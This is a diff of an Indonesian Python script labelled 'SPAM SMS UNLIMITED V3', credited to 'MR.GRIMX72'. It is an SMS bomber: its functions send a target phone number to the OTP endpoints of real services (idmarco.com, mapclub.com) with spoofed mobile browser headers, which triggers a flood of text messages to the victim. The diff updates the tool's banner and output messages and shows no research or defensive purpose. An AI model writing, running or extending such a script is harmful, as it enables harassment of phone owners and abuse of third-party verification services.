@@ -11,18 +11,7 @@ def marco():
     d={"phone":no}
     r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
     if r:
-        print ("Succes Mengirim Pesan Ke ",no)
-def marco1():
-    ua={
-    "Host": "www.idmarco.com",
-    "accept": "*/*",
-    "x-requested-with": "XMLHttpRequest",
-    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
-    }
-    x={"phone":no}
-    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=x, headers=ua)
-    if r:
-        print ("Succes Mengirim Pesan Ke ",no)    
+        print ("SUCCES MENGIRIM PESAN KE",no)    
 def mapclub():
     ua={
     "Host": "cmsapi.mapclub.com",
@@ -38,12 +27,20 @@ def mapclub():
     dat=json.dumps({"phone":no})
     r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
     if "ok" in r:
-        print ("Succes Mengirim Pesan Ke ",no)
+        print ("SUCCES MENGIRIM PESAN KE",no)
     else:
-        print ("Gagal Mengirim Pesan:(")
+        print ("GAGAL MENGIRIM PESAN:(")
         sys.exit()
 os.system("clear")
-print ("""\033[1;97mSPAM SMS UNLIMITED
+time.sleep(1)
+print ("\033[1;96m[!] Loading Cuk. . .")
+time.sleep(1)
+print ("\033[1;96mOrang sabar disayang tuhan:)")
+time.sleep(10)
+
+os.system("clear")
+print ("""\033[1;97mSPAM SMS UNLIMITED V3
+\033[90m-------------------------------
 \033[1;97mCreator:\033[1;96mMR.GRIMX72
 \033[1;97mYoutube:\033[1;96mBelum Ada
 \033[1;97mContoh Nomor:\033[1;96mGunakan 62
